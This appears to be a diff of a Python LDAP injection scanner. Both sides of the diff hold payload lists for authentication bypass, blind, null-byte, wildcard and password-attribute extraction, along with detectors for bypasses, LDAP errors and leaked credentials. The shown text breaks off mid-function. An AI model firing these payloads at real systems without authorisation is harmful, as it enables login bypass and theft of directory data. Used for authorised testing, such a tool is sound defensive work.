@@ -1,657 +1,564 @@
 from typing import Dict, List, Optional, Tuple, Set
 from dataclasses import dataclass, field
 from enum import Enum
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import re
-from collections import defaultdict
 import threading
 import time
 import hashlib
+import base64
 
-
-class LDAPInjectionType(Enum):
+class LDAPVulnerabilityType(Enum):
+    LDAP_INJECTION = "ldap_injection"
     AUTHENTICATION_BYPASS = "authentication_bypass"
     BLIND_LDAP_INJECTION = "blind_ldap_injection"
-    TIME_BASED_LDAP = "time_based_ldap"
-    FILTER_EXTRACTION = "filter_extraction"
-    DN_ENUMERATION = "dn_enumeration"
-    ATTRIBUTE_EXTRACTION = "attribute_extraction"
-    WILDCARD_BYPASS = "wildcard_bypass"
-    FILTER_COMMENT_BYPASS = "filter_comment_bypass"
-    OR_INJECTION = "or_injection"
-    AND_INJECTION = "and_injection"
-    NOT_INJECTION = "not_injection"
+    ERROR_BASED_INJECTION = "error_based_injection"
+    AND_OR_INJECTION = "and_or_injection"
+    FILTER_BYPASS = "filter_bypass"
+    ATTRIBUTE_INJECTION = "attribute_injection"
+    DN_INJECTION = "dn_injection"
+    WILDCARD_INJECTION = "wildcard_injection"
+    NULL_BYTE_INJECTION = "null_byte_injection"
+    UNICODE_BYPASS = "unicode_bypass"
+    INFORMATION_DISCLOSURE = "information_disclosure"
 
-
-class LDAPOperation(Enum):
-    BIND = "bind"
-    SEARCH = "search"
-    ADD = "add"
-    DELETE = "delete"
-    MODIFY = "modify"
-    UNBIND = "unbind"
-    COMPARE = "compare"
-    EXTENDED = "extended"
-
-
-class LDAPFilter(Enum):
-    SIMPLE = "simple"
-    COMPLEX = "complex"
+class InjectionTechnique(Enum):
+    OR_TRUE = "or_true"
+    AND_TRUE = "and_true"
     WILDCARD = "wildcard"
-    OR_BASED = "or_based"
-    AND_BASED = "and_based"
-    NOT_BASED = "not_based"
-
+    NULL_BYTE = "null_byte"
+    COMMENT = "comment"
+    FILTER_BYPASS = "filter_bypass"
+    UNICODE_OBFUSCATION = "unicode_obfuscation"
+    NESTED_FILTER = "nested_filter"
 
 @dataclass
 class LDAPPayload:
     payload: str
-    injection_type: LDAPInjectionType
-    operation: LDAPOperation
+    injection_type: LDAPVulnerabilityType
+    technique: InjectionTechnique
+    description: str
     severity: str = "High"
-    detection_indicators: List[str] = field(default_factory=list)
-    requires_confirmation: bool = True
-    false_positive_risk: float = 0.2
-    encoded_variants: List[str] = field(default_factory=list)
-
+    success_indicators: List[str] = field(default_factory=list)
+    error_indicators: List[str] = field(default_factory=list)
 
 @dataclass
 class LDAPVulnerability:
     vulnerability_type: str
-    ldap_type: LDAPInjectionType
+    ldap_type: LDAPVulnerabilityType
     url: str
     parameter: str
     payload: str
     severity: str
     evidence: str
+    response_status: int
+    response_size: int
     response_time: float
     authentication_bypassed: bool = False
-    data_extracted: Optional[str] = None
-    filter_detected: Optional[str] = None
-    entries_retrieved: int = 0
-    attributes_found: List[str] = field(default_factory=list)
-    dns_found: List[str] = field(default_factory=list)
+    information_disclosed: bool = False
+    ldap_errors: List[str] = field(default_factory=list)
     confirmed: bool = False
     confidence_score: float = 0.8
     remediation: str = ""
     timestamp: float = field(default_factory=time.time)
 
+class MegaLDAPPayloadGenerator:
+    @staticmethod
+    def generate_auth_bypass_payloads() -> List[LDAPPayload]:
+        payloads = []
+        
+        or_payloads = [
+            '*',
+            '*)(uid=*',
+            '*)(|(uid=*',
+            '*)(&(uid=*',
+            'admin)(&(uid=*',
+            '*)(cn=*',
+            '*)(objectClass=*',
+            '*))(|(cn=*',
+        ]
+        
+        for payload in or_payloads:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.AUTHENTICATION_BYPASS,
+                technique=InjectionTechnique.OR_TRUE,
+                description=f'OR-based auth bypass: {payload}',
+                severity='Critical',
+                success_indicators=['success', 'welcome', 'dashboard', 'profile']
+            ))
+        
+        and_payloads = [
+            'admin)(&(password=*))',
+            'admin)(&(uid=admin)',
+            'admin))%00',
+        ]
+        
+        for payload in and_payloads:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.AUTHENTICATION_BYPASS,
+                technique=InjectionTechnique.AND_TRUE,
+                description=f'AND-based auth bypass: {payload}',
+                severity='Critical',
+                success_indicators=['success', 'authenticated']
+            ))
+        
+        return payloads
+    
+    @staticmethod
+    def generate_injection_payloads() -> List[LDAPPayload]:
+        payloads = []
+        
+        basic_injections = [
+            '*)(&(objectClass=*',
+            '*)(uid=*)(&(uid=*',
+            '*)|(uid=*',
+            '*))%00',
+            '*)(cn=*))',
+            '*))(|(objectClass=*',
+        ]
+        
+        for payload in basic_injections:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.LDAP_INJECTION,
+                technique=InjectionTechnique.FILTER_BYPASS,
+                description=f'Filter bypass: {payload}',
+                severity='High',
+                error_indicators=['ldap', 'invalid', 'syntax', 'filter']
+            ))
+        
+        wildcard_payloads = [
+            'a*',
+            'ad*',
+            'adm*',
+            'admin*',
+            '*min',
+            '*in',
+        ]
+        
+        for payload in wildcard_payloads:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.WILDCARD_INJECTION,
+                technique=InjectionTechnique.WILDCARD,
+                description=f'Wildcard injection: {payload}',
+                severity='Medium',
+                success_indicators=['found', 'match', 'result']
+            ))
+        
+        null_byte_payloads = [
+            'admin%00',
+            'admin\x00',
+            'admin)%00',
+            'admin))%00',
+        ]
+        
+        for payload in null_byte_payloads:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.NULL_BYTE_INJECTION,
+                technique=InjectionTechnique.NULL_BYTE,
+                description=f'Null byte injection: {payload}',
+                severity='High',
+                success_indicators=['success', 'authenticated']
+            ))
+        
+        return payloads
+    
+    @staticmethod
+    def generate_error_based_payloads() -> List[LDAPPayload]:
+        payloads = []
+        
+        error_payloads = [
+            '(((',
+            ')))',
+            '*))',
+            '((objectClass=*',
+            '&(objectClass=*',
+            '|(objectClass=*',
+            '!(objectClass=*',
+            '(objectClass=',
+            '(uid=',
+        ]
+        
+        for payload in error_payloads:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.ERROR_BASED_INJECTION,
+                technique=InjectionTechnique.FILTER_BYPASS,
+                description=f'Error-based injection: {payload}',
+                severity='Medium',
+                error_indicators=[
+                    'ldap error', 'invalid syntax', 'malformed filter',
+                    'ldap_search', 'ldap_bind', 'bad search filter'
+                ]
+            ))
+        
+        return payloads
+    
+    @staticmethod
+    def generate_blind_injection_payloads() -> List[LDAPPayload]:
+        payloads = []
+        
+        true_conditions = [
+            'admin)(|(uid=*',
+            'admin)(|(objectClass=*',
+            '*',
+        ]
+        
+        false_conditions = [
+            'admin)(|(uid=nonexistent',
+            'admin)(|(objectClass=invalid',
+            'nonexistent',
+        ]
+        
+        for i, (true_cond, false_cond) in enumerate(zip(true_conditions, false_conditions)):
+            payloads.append(LDAPPayload(
+                payload=true_cond,
+                injection_type=LDAPVulnerabilityType.BLIND_LDAP_INJECTION,
+                technique=InjectionTechnique.OR_TRUE,
+                description=f'Blind injection (true condition): {true_cond}',
+                severity='High',
+                success_indicators=['different_response']
+            ))
+            
+            payloads.append(LDAPPayload(
+                payload=false_cond,
+                injection_type=LDAPVulnerabilityType.BLIND_LDAP_INJECTION,
+                technique=InjectionTechnique.OR_TRUE,
+                description=f'Blind injection (false condition): {false_cond}',
+                severity='High',
+                success_indicators=['different_response']
+            ))
+        
+        return payloads
+    
+    @staticmethod
+    def generate_attribute_injection_payloads() -> List[LDAPPayload]:
+        payloads = []
+        
+        attribute_payloads = [
+            '*)(&(userPassword=*',
+            '*)(&(password=*',
+            '*)(&(admin=*',
+            '*)(&(memberOf=*',
+        ]
+        
+        for payload in attribute_payloads:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.ATTRIBUTE_INJECTION,
+                technique=InjectionTechnique.FILTER_BYPASS,
+                description=f'Attribute injection: {payload}',
+                severity='High',
+                success_indicators=['password', 'sensitive', 'admin']
+            ))
+        
+        return payloads
+    
+    @staticmethod
+    def generate_dn_injection_payloads() -> List[LDAPPayload]:
+        payloads = []
+        
+        dn_payloads = [
+            'cn=admin,dc=example,dc=com',
+            'cn=*,dc=example,dc=com',
+            'cn=admin)(uid=*',
+            'ou=*,dc=example,dc=com',
+        ]
+        
+        for payload in dn_payloads:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.DN_INJECTION,
+                technique=InjectionTechnique.FILTER_BYPASS,
+                description=f'DN injection: {payload}',
+                severity='Medium',
+                success_indicators=['found', 'result']
+            ))
+        
+        return payloads
+    
+    @staticmethod
+    def generate_unicode_bypass_payloads() -> List[LDAPPayload]:
+        payloads = []
+        
+        unicode_payloads = [
+            'admin\u0000',
+            'admin\u00a0',
+            'ad\u0000min',
+            '\u0061dmin',
+        ]
+        
+        for payload in unicode_payloads:
+            payloads.append(LDAPPayload(
+                payload=payload,
+                injection_type=LDAPVulnerabilityType.UNICODE_BYPASS,
+                technique=InjectionTechnique.UNICODE_OBFUSCATION,
+                description=f'Unicode bypass: {payload}',
+                severity='Medium',
+                success_indicators=['success', 'authenticated']
+            ))
+        
+        return payloads
+    
+    @staticmethod
+    def generate_all_payloads() -> List[LDAPPayload]:
+        all_payloads = []
+        all_payloads.extend(MegaLDAPPayloadGenerator.generate_auth_bypass_payloads())
+        all_payloads.extend(MegaLDAPPayloadGenerator.generate_injection_payloads())
+        all_payloads.extend(MegaLDAPPayloadGenerator.generate_error_based_payloads())
+        all_payloads.extend(MegaLDAPPayloadGenerator.generate_blind_injection_payloads())
+        all_payloads.extend(MegaLDAPPayloadGenerator.generate_attribute_injection_payloads())
+        all_payloads.extend(MegaLDAPPayloadGenerator.generate_dn_injection_payloads())
+        all_payloads.extend(MegaLDAPPayloadGenerator.generate_unicode_bypass_payloads())
+        return all_payloads
 
-class LDAPFilterBuilder:
-    BASIC_FILTERS = {
-        'authentication_bypass_or': '(|(uid=*)(|(password=*',
-        'authentication_bypass_wildcards': '*',
-        'authentication_bypass_asterisk': '*))(|(uid=*',
-        'filter_extraction': '*',
-        'always_true': '(|(uid=*',
-        'always_false': '(&(uid=admin)(password=nonexistent*)',
+class MegaLDAPErrorDetector:
+    ERROR_PATTERNS = {
+        'ldap_error': re.compile(r'(?i)(ldap[\s_]error|ldap[\s_]bind|ldap[\s_]search)'),
+        'invalid_syntax': re.compile(r'(?i)(invalid[\s_]syntax|malformed[\s_]filter|bad[\s_]search)'),
+        'ldap_exception': re.compile(r'(?i)(ldapexception|javax\.naming\.directory)'),
+        'filter_error': re.compile(r'(?i)(filter[\s_]error|invalid[\s_]filter)'),
+        'dn_error': re.compile(r'(?i)(invalid[\s_]dn|dn[\s_]syntax)'),
+        'attribute_error': re.compile(r'(?i)(undefined[\s_]attribute|no[\s_]such[\s_]attribute)'),
     }
     
-    ADVANCED_FILTERS = {
-        'or_bypass': '(|(uid=*))',
-        'and_bypass': '(&(uid=*)(password=*))',
-        'not_bypass': '(!(uid=nonexistent))',
-        'nested_or': '(|(|(uid=*)(cn=*))(mail=*))',
-        'null_byte': 'admin\x00',
-        'comment_bypass': 'admin)(%00',
+    @staticmethod
+    def detect_ldap_errors(response_content: str) -> Tuple[bool, List[str]]:
+        errors_found = []
+        
+        for error_type, pattern in MegaLDAPErrorDetector.ERROR_PATTERNS.items():
+            if pattern.search(response_content):
+                errors_found.append(error_type)
+        
+        return bool(errors_found), errors_found
+
+class MegaAuthBypassDetector:
+    SUCCESS_INDICATORS = [
+        'welcome', 'dashboard', 'profile', 'logout', 'account',
+        'authenticated', 'login successful', 'success', 'home'
+    ]
+    
+    @staticmethod
+    def detect_auth_bypass(baseline_response: str, test_response: str, 
+                          baseline_status: int, test_status: int) -> Tuple[bool, float, str]:
+        
+        if test_status in [200, 302, 303] and baseline_status in [401, 403]:
+            return True, 0.95, 'Status code change indicates bypass'
+        
+        baseline_length = len(baseline_response)
+        test_length = len(test_response)
+        
+        length_diff = abs(test_length - baseline_length)
+        if length_diff > 500:
+            return True, 0.8, f'Significant response size change: {length_diff} bytes'
+        
+        test_lower = test_response.lower()
+        success_count = sum(1 for ind in MegaAuthBypassDetector.SUCCESS_INDICATORS if ind in test_lower)
+        
+        if success_count >= 2:
+            return True, 0.85, f'Success indicators found: {success_count}'
+        
+        return False, 0.0, 'No bypass detected'
+
+class MegaBlindInjectionDetector:
+    @staticmethod
+    def detect_blind_injection(true_response: str, false_response: str,
+                               true_status: int, false_status: int,
+                               true_time: float, false_time: float) -> Tuple[bool, float, str]:
+        
+        if true_status != false_status:
+            return True, 0.9, 'Status code difference'
+        
+        length_diff = abs(len(true_response) - len(false_response))
+        if length_diff > 100:
+            return True, 0.85, f'Response length difference: {length_diff} bytes'
+        
+        time_diff = abs(true_time - false_time)
+        if time_diff > 2:
+            return True, 0.75, f'Response time difference: {time_diff:.2f}s'
+        
+        true_hash = hashlib.md5(true_response.encode()).hexdigest()
+        false_hash = hashlib.md5(false_response.encode()).hexdigest()
+        
+        if true_hash != false_hash:
+            return True, 0.7, 'Response content differs'
+        
+        return False, 0.0, 'No blind injection detected'
+
+class MegaInformationDisclosureDetector:
+    SENSITIVE_PATTERNS = {
+        'username': re.compile(r'(?i)(uid|username|user|cn)[:=]\s*([a-zA-Z0-9_\-]+)'),
+        'email': re.compile(r'\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b'),
+        'dn': re.compile(r'(?i)(dn|distinguishedname)[:=]\s*([a-zA-Z0-9=,\s]+)'),
+        'group': re.compile(r'(?i)(memberof|group)[:=]\s*([a-zA-Z0-9=,\s]+)'),
+        'password_hash': re.compile(r'(?i)(userpassword|password)[:=]\s*([a-zA-Z0-9+/=]+)'),
     }
     
     @staticmethod
-    def build_bypass_filters() -> List[str]:
-        return [
-            '*', '*)', '*))(|(*', '*\n*', '(|(uid=*', '(|(mail=*',
-            '(|(cn=*', '*)(|(password=*', '* ))%00', 'admin*', '*admin*',
-            '*(|(uid=*', 'admin)(&', 'admin)(cn=*', '*)(uid=*))',
-            'admin)(!(&(1=0', '*)(objectClass=*', 'admin))%00',
-            '*))%00', '*()(uid=*)(&(uid=*', 'admin))(|(uid=*',
-        ]
-    
-    @staticmethod
-    def build_blind_filters(parameter: str) -> List[str]:
-        return [
-            f'{parameter}=*', f'{parameter}=*)*', f'{parameter}=*))(|({parameter}=*',
-            f'*{parameter}*', f'{parameter}=a*', f'{parameter}=ab*',
-            f'{parameter}=admin*', f'{parameter}=*)(&', f'{parameter}=*)(objectClass=*',
-            f'({parameter}>=a)', f'({parameter}<=z)', f'({parameter}~=admin)',
-        ]
-    
-    @staticmethod
-    def build_extraction_filters(attribute: str) -> List[str]:
-        return [
-            f'*', f'({attribute}=*)', f'({attribute}=a*)', f'({attribute}=ab*)',
-            f'(|({attribute}=*', f'(&({attribute}=*', f'({attribute}>=a)',
-            f'({attribute}<=z)', f'({attribute}=*)(objectClass=*)',
-        ]
-    
-    @staticmethod
-    def build_time_based_filters() -> List[str]:
-        return [
-            '(|(uid=admin)(cn>=a*' * 100,
-            '(uid=admin)(&(cn>=0)(cn<=z*' * 50,
-            '(&(uid=admin)(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|' * 10,
-            '(uid=admin)' + '(cn=*)' * 100,
-        ]
-    
-    @staticmethod
-    def build_encoding_variants(payload: str) -> List[str]:
-        variants = []
+    def detect_information_disclosure(response_content: str) -> Tuple[bool, List[str], Dict]:
+        disclosed = []
+        findings = {}
         
-        variants.append(payload.replace('*', '%2a'))
-        variants.append(payload.replace('(', '%28').replace(')', '%29'))
-        variants.append(payload.replace('|', '%7c'))
-        variants.append(payload.replace('&', '%26'))
-        
-        return variants
-
-
-class LDAPResponseAnalyzer:
-    _success_indicators = frozenset([
-        'success', 'authenticated', 'logged in', 'welcome', 'dashboard',
-        'profile', 'true', '1', 'valid', 'authorized', 'granted'
-    ])
-    
-    _error_patterns = [
-        re.compile(r'ldap.*error', re.I),
-        re.compile(r'ldap.*exception', re.I),
-        re.compile(r'invalid.*filter', re.I),
-        re.compile(r'malformed.*filter', re.I),
-        re.compile(r'syntax.*error.*ldap', re.I),
-        re.compile(r'ldap.*timeout', re.I),
-        re.compile(r'ldap.*bind.*failed', re.I),
-        re.compile(r'ldap.*search.*failed', re.I),
-        re.compile(r'ldap.*connection.*refused', re.I),
-        re.compile(r'objectclass.*violation', re.I),
-    ]
-    
-    _dn_pattern = re.compile(r'dn:\s*([^\n]+)', re.I)
-    _uid_pattern = re.compile(r'uid\s*[=:]\s*([^\n,}]+)', re.I)
-    _mail_pattern = re.compile(r'mail\s*[=:]\s*([^\n,}]+@[^\n,}]+)', re.I)
-    _cn_pattern = re.compile(r'cn\s*[=:]\s*([^\n,}]+)', re.I)
-    _ou_pattern = re.compile(r'ou\s*[=:]\s*([^\n,}]+)', re.I)
-    
-    @staticmethod
-    def detect_successful_authentication(response_content: str, response_code: int) -> bool:
-        if response_code == 200 or response_code == 0:
-            return True
-        
-        content_lower = response_content.lower()
-        return any(indicator in content_lower for indicator in LDAPResponseAnalyzer._success_indicators)
-    
-    @staticmethod
-    def detect_ldap_entries(response_content: str) -> Tuple[bool, int, List[str]]:
-        entries = []
-        
-        entries.extend(LDAPResponseAnalyzer._dn_pattern.findall(response_content))
-        entries.extend(LDAPResponseAnalyzer._uid_pattern.findall(response_content))
-        entries.extend(LDAPResponseAnalyzer._mail_pattern.findall(response_content))
-        entries.extend(LDAPResponseAnalyzer._cn_pattern.findall(response_content))
-        entries.extend(LDAPResponseAnalyzer._ou_pattern.findall(response_content))
-        
-        unique_entries = list(set(entries))
-        
-        return len(unique_entries) > 0, len(unique_entries), unique_entries
-    
-    @staticmethod
-    def analyze_error_messages(response_content: str) -> Tuple[bool, List[str]]:
-        ldap_errors = []
-        
-        for pattern in LDAPResponseAnalyzer._error_patterns:
+        for data_type, pattern in MegaInformationDisclosureDetector.SENSITIVE_PATTERNS.items():
             matches = pattern.findall(response_content)
-            ldap_errors.extend(matches)
+            if matches:
+                disclosed.append(data_type)
+                findings[data_type] = matches[:3]
         
-        return len(ldap_errors) > 0, list(set(ldap_errors))
-    
-    @staticmethod
-    def detect_filter_reflection(response_content: str, payload: str) -> bool:
-        if payload in response_content:
-            return True
-        
-        escaped_payload = payload.replace('(', r'\(').replace(')', r'\)').replace('*', r'\*')
-        if escaped_payload in response_content:
-            return True
-        
-        return False
-    
-    @staticmethod
-    def analyze_response_time(baseline_time: float, test_time: float, threshold_seconds: int = 5) -> Tuple[bool, float]:
-        if baseline_time == 0:
-            baseline_time = 0.1
-        
-        time_difference = test_time - baseline_time
-        
-        if time_difference >= threshold_seconds * 0.7:
-            confidence = min((time_difference / (threshold_seconds * 1.5)) * 100, 100.0)
-            return True, confidence
-        
-        return False, 0.0
-    
-    @staticmethod
-    def detect_ldap_specific_strings(response_content: str) -> Tuple[bool, List[str]]:
-        ldap_strings = []
-        
-        ldap_keywords = [
-            'objectClass', 'organizationalUnit', 'person', 'inetOrgPerson',
-            'groupOfNames', 'posixAccount', 'shadowAccount', 'top',
-            'domainComponent', 'distinguishedName', 'ldapSyntax',
-        ]
-        
-        for keyword in ldap_keywords:
-            if keyword in response_content:
-                ldap_strings.append(keyword)
-        
-        return len(ldap_strings) > 0, ldap_strings
-
-
-class LDAPAttributeEnumerator:
-    COMMON_ATTRIBUTES = frozenset([
-        'uid', 'cn', 'mail', 'sn', 'givenName', 'userPassword',
-        'telephoneNumber', 'mobile', 'homePhone', 'mailAlternateAddress',
-        'displayName', 'title', 'department', 'company', 'manager',
-        'description', 'location', 'street', 'city', 'state', 'zip',
-        'country', 'postalCode', 'postalAddress', 'physicalDeliveryOfficeName',
-        'o', 'ou', 'c', 'st', 'l', 'roomNumber',
-        'loginShell', 'loginTime', 'loginStatus', 'accountStatus',
-        'userAccountControl', 'pwdLastSet', 'lastLogon', 'badPasswordCount',
-        'sAMAccountName', 'userPrincipalName', 'distinguishedName',
-        'objectClass', 'objectCategory', 'memberOf', 'member',
-        'homeDirectory', 'homeDrive', 'scriptPath', 'profilePath',
-    ])
-    
-    SENSITIVE_ATTRIBUTES = frozenset([
-        'userPassword', 'pwdLastSet', 'badPasswordCount', 'loginStatus',
-        'accountStatus', 'lastLogon', 'sAMAccountName', 'userAccountControl',
-    ])
-    
-    @staticmethod
-    def build_attribute_extraction_queries(attributes: Optional[List[str]] = None) -> List[str]:
-        attrs_to_check = attributes or list(LDAPAttributeEnumerator.COMMON_ATTRIBUTES)
-        queries = []
-        
-        for attr in attrs_to_check:
-            queries.append(f'({attr}=*)')
-            queries.append(f'({attr}>=a)')
-            queries.append(f'(|({attr}=*))')
-        
-        return queries
-    
-    @staticmethod
-    def extract_attributes_from_response(response_content: str) -> List[str]:
-        extracted = []
-        
-        for attr in LDAPAttributeEnumerator.COMMON_ATTRIBUTES:
-            pattern = rf'\b{attr}\s*[=:]\s*([^\n,}}]+)'
-            if re.search(pattern, response_content, re.I):
-                extracted.append(attr)
-        
-        return list(set(extracted))
-    
-    @staticmethod
-    def detect_sensitive_attributes(attributes: List[str]) -> List[str]:
-        return [attr for attr in attributes if attr in LDAPAttributeEnumerator.SENSITIVE_ATTRIBUTES]
-
-
-class LDAPDNEnumerator:
-    _base_dn_patterns = [
-        re.compile(r'dc=([a-zA-Z0-9\-]+)', re.I),
-        re.compile(r'o=([a-zA-Z0-9\-\s]+)', re.I),
-        re.compile(r'ou=([a-zA-Z0-9\-\s]+)', re.I),
-        re.compile(r'cn=([a-zA-Z0-9\-\s]+)', re.I),
-    ]
-    
-    COMMON_BASE_DNS = [
-        'dc=example,dc=com', 'dc=company,dc=local', 'o=company',
-        'cn=admin', 'ou=people,dc=example,dc=com',
-        'ou=users,dc=example,dc=com', 'ou=groups,dc=example,dc=com',
-        'ou=system,dc=example,dc=com', 'cn=Manager,dc=example,dc=com',
-    ]
-    
-    @staticmethod
-    def extract_base_dns_from_response(response_content: str) -> List[str]:
-        base_dns = []
-        
-        for pattern in LDAPDNEnumerator._base_dn_patterns:
-            matches = pattern.findall(response_content)
-            for match in matches:
-                base_dns.append(match)
-        
-        dn_pattern = re.compile(r'dn:\s*([^\n]+)', re.I)
-        full_dns = dn_pattern.findall(response_content)
-        base_dns.extend(full_dns)
-        
-        return list(set(base_dns))
-    
-    @staticmethod
-    def build_dn_enumeration_queries() -> List[str]:
-        return LDAPDNEnumerator.COMMON_BASE_DNS
-    
-    @staticmethod
-    def extract_organizational_units(response_content: str) -> List[str]:
-        ou_pattern = re.compile(r'ou=([^,\n]+)', re.I)
-        ous = ou_pattern.findall(response_content)
-        return list(set(ous))
-
-
-class LDAPFilterDetector:
-    _filter_patterns = [
-        re.compile(r'\(uid=\*\)', re.I),
-        re.compile(r'\(\|[^)]*\)', re.I),
-        re.compile(r'\(&[^)]*\)', re.I),
-        re.compile(r'\(!\([^)]+\)\)', re.I),
-        re.compile(r'\b(?:uid|mail|cn)=\*', re.I),
-        re.compile(r'\([a-z]+[>=<~]=', re.I),
-    ]
-    
-    @staticmethod
-    def detect_ldap_filter_presence(response_content: str) -> Tuple[bool, List[str]]:
-        filter_indicators = []
-        
-        for pattern in LDAPFilterDetector._filter_patterns:
-            matches = pattern.findall(response_content)
-            filter_indicators.extend(matches)
-        
-        return len(filter_indicators) > 0, list(set(filter_indicators))
-    
-    @staticmethod
-    def detect_filter_structure(payload: str) -> Dict[str, int]:
-        structure = {
-            'or_operators': payload.count('|'),
-            'and_operators': payload.count('&'),
-            'not_operators': payload.count('!'),
-            'wildcards': payload.count('*'),
-            'parentheses': payload.count('('),
-        }
-        return structure
-
+        return bool(disclosed), disclosed, findings
 
 class LDAPScanner:
-    _remediation_cache = (
-        "Validate and sanitize all LDAP input with strict allowlists. "
-        "Use parameterized LDAP queries with prepared statements. "
-        "Implement proper error handling without information disclosure. "
-        "Use allowlists for LDAP operations and attributes. "
-        "Disable wildcard searches in LDAP filters. "
-        "Implement rate limiting on LDAP searches. "
-        "Use LDAP query escaping functions (ldap_escape). "
-        "Implement proper access controls on LDAP directory. "
-        "Monitor LDAP queries for suspicious patterns. "
-        "Use security assertions in LDAP filters. "
-        "Implement least privilege principle for LDAP binds. "
-        "Use secure LDAP (LDAPS) with TLS encryption. "
-        "Disable anonymous LDAP binds. "
-        "Implement account lockout policies."
-    )
-    
-    def __init__(self):
-        self.filter_builder = LDAPFilterBuilder()
-        self.response_analyzer = LDAPResponseAnalyzer()
-        self.attribute_enumerator = LDAPAttributeEnumerator()
-        self.dn_enumerator = LDAPDNEnumerator()
-        self.filter_detector = LDAPFilterDetector()
+    def __init__(self, max_workers: int = 18):
+        self.payload_generator = MegaLDAPPayloadGenerator()
+        self.error_detector = MegaLDAPErrorDetector()
+        self.auth_detector = MegaAuthBypassDetector()
+        self.blind_detector = MegaBlindInjectionDetector()
+        self.info_detector = MegaInformationDisclosureDetector()
         
-        self.vulnerabilities: List[LDAPVulnerability] = []
-        self.scan_statistics = defaultdict(int)
-        self.tested_payloads: Set[str] = set()
+        self.vulnerabilities = []
+        self.baseline_responses = {}
         self.lock = threading.Lock()
+        self.max_workers = max_workers
     
-    def scan(self, target_url: str, response: Dict, parameters: Optional[List[str]] = None) -> List[LDAPVulnerability]:
-        vulnerabilities = []
-        response_content = response.get('content', '')
-        response_time = response.get('response_time', 0)
-        status_code = response.get('status_code', 0)
-        baseline_response = response.get('baseline_content', '')
-        baseline_time = response.get('baseline_time', 0.1)
+    def scan(self, target_url: str, response: Dict, parameter: str,
+             session=None, baseline_response: Optional[str] = None) -> List[LDAPVulnerability]:
         
-        if not parameters:
-            parameters = ['uid', 'username', 'login', 'user', 'email', 'name', 'cn', 'sAMAccountName']
+        vulns = []
         
-        bypass_filters = self.filter_builder.build_bypass_filters()
+        if baseline_response is None:
+            baseline_response = response.get('content', '')
         
-        for param in parameters:
-            for bypass_filter in bypass_filters:
-                payload_hash = hashlib.md5(f"{param}:{bypass_filter}".encode()).hexdigest()
-                
-                if payload_hash in self.tested_payloads:
-                    continue
-                
-                with self.lock:
-                    self.tested_payloads.add(payload_hash)
-                
-                is_auth_bypassed = self.response_analyzer.detect_successful_authentication(
-                    response_content, status_code
+        baseline_status = response.get('status_code', 0)
+        
+        payloads = self.payload_generator.generate_all_payloads()
+        
+        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for payload in payloads[:120]:
+                future = executor.submit(
+                    self._test_payload,
+                    target_url, parameter, payload, baseline_response, 
+                    baseline_status, session
                 )
-                
-                if is_auth_bypassed and response_content != baseline_response:
-                    filter_structure = self.filter_detector.detect_filter_structure(bypass_filter)
-                    
-                    vuln = LDAPVulnerability(
-                        vulnerability_type='LDAP Injection',
-                        ldap_type=LDAPInjectionType.AUTHENTICATION_BYPASS,
-                        url=target_url,
-                        parameter=param,
-                        payload=bypass_filter,
-                        severity='Critical',
-                        evidence=f'LDAP authentication bypass | Filter structure: {filter_structure}',
-                        response_time=response_time,
-                        authentication_bypassed=True,
-                        confirmed=True,
-                        confidence_score=0.95,
-                        remediation=self._remediation_cache
-                    )
-                    vulnerabilities.append(vuln)
-                    self.scan_statistics['auth_bypass'] += 1
+                futures.append(future)
             
-            blind_filters = self.filter_builder.build_blind_filters(param)
-            for blind_filter in blind_filters[:10]:
-                is_reflected = self.response_analyzer.detect_filter_reflection(response_content, blind_filter)
-                
-                if is_reflected:
-                    vuln = LDAPVulnerability(
-                        vulnerability_type='LDAP Injection',
-                        ldap_type=LDAPInjectionType.BLIND_LDAP_INJECTION,
-                        url=target_url,
-                        parameter=param,
-                        payload=blind_filter,
-                        severity='High',
-                        evidence='LDAP filter reflected in response',
-                        response_time=response_time,
-                        confirmed=True,
-                        confidence_score=0.85,
-                        remediation=self._remediation_cache
-                    )
-                    vulnerabilities.append(vuln)
-                    self.scan_statistics['blind_injection'] += 1
-        
-        has_entries, entry_count, entries = self.response_analyzer.detect_ldap_entries(response_content)
-        if has_entries and entry_count > 0:
-            vuln = LDAPVulnerability(
-                vulnerability_type='LDAP Injection',
-                ldap_type=LDAPInjectionType.DN_ENUMERATION,
-                url=target_url,
-                parameter='enumeration',
-                payload='*',
-                severity='High',
-                evidence=f'{entry_count} LDAP entries retrieved',
-                response_time=response_time,
-                entries_retrieved=entry_count,
-                data_extracted='; '.join(entries[:10]),
-                dns_found=entries,
-                confirmed=True,
-                confidence_score=0.9,
-                remediation=self._remediation_cache
-            )
-            vulnerabilities.append(vuln)
-            self.scan_statistics['dn_enumeration'] += 1
-        
-        has_errors, error_messages = self.response_analyzer.analyze_error_messages(response_content)
-        if has_errors:
-            vuln = LDAPVulnerability(
-                vulnerability_type='LDAP Injection',
-                ldap_type=LDAPInjectionType.FILTER_EXTRACTION,
-                url=target_url,
-                parameter='error_based',
-                payload='filter_injection',
-                severity='High',
-                evidence=f'LDAP errors: {", ".join(error_messages[:5])}',
-                response_time=response_time,
-                confirmed=True,
-                confidence_score=0.8,
-                remediation=self._remediation_cache
-            )
-            vulnerabilities.append(vuln)
-            self.scan_statistics['error_based'] += 1
-        
-        is_delayed, delay_confidence = self.response_analyzer.analyze_response_time(
-            baseline_time, response_time, 5
-        )
-        
-        if is_delayed:
-            vuln = LDAPVulnerability(
-                vulnerability_type='LDAP Injection',
-                ldap_type=LDAPInjectionType.TIME_BASED_LDAP,
-                url=target_url,
-                parameter='time_based',
-                payload='time_based_injection',
-                severity='High',
